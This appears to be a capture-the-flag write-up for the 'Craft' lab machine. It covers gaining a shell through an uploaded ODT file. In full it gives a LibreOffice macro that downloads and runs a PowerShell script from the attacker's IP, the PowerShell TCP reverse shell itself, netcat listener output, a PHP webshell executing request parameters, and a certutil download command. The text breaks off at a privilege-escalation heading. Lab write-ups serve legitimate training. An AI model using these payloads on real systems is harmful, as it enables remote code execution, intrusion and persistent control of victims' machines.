# PG Craft
## ODT File Upload, xampp\htdocs
## nmap
```
nmap -Pn -sCV — open -p- — min-rate 10000 -oN nmap_open.txt 192.168.249.169
```
## Apache (80) 
```
ODT File Upload form
```
## Create the malicious ODT file
```
Open Libreoffice > Tools > Macros > Organize Macros > Basic
Click “Untitled 1” > “New” and name the filename and click “OK”, then edit for sub and end. 

REM ***** BASIC *****

Sub Main
	Shell("cmd /c powershell ""iex(new-object net.webclient).downloadstring('http://192.168.45.249:8000/powershell_reverse_shell.ps1')""")
End Sub 

between “Sub Main” and “End Sub” (which will perform an HTTP request to our IP). If we are hosting on port 80 and the port is open the command should execute:
powershell_reverse_shell.ps1:

$client = New-Object System.Net.Sockets.TCPClient(“192.168.49.249”,80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + “PS “ + (pwd).Path + “> “;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

Open a server with Python
python3 -m http.server 8000

Upload the file to the site
```
## Shell
```
Get a callback:
└─# nc -nvlp 80
listening on [any] 80 …
connect to [192.168.49.249] from (UNKNOWN) [192.168.249.169] 50049PS C:\Program Files\LibreOffice\program> whoami /privPRIVILEGES INFORMATION
 ```

## Apache
```
We can write a file in C:\xampp\htdocs folder. I will upload a webshell.

PS C:\Program Files\LibreOffice\program> icacls C:\xampp\htdocs
C:\xampp\htdocs CRAFT\apache:(OI)(CI)(F)
                CRAFT\apache:(I)(OI)(CI)(F)
                NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                BUILTIN\Administrators:(I)(OI)(CI)(F)
                BUILTIN\Users:(I)(OI)(CI)(RX)
                BUILTIN\Users:(I)(CI)(AD)
                BUILTIN\Users:(I)(CI)(WD)
                CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```
## Webshell
```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>

PS C:\xampp\htdocs\assets> certutil -urlcache -split -f http://192.168.49.249:8000/webshell.php
```
## SeImpersonate to NT Authority









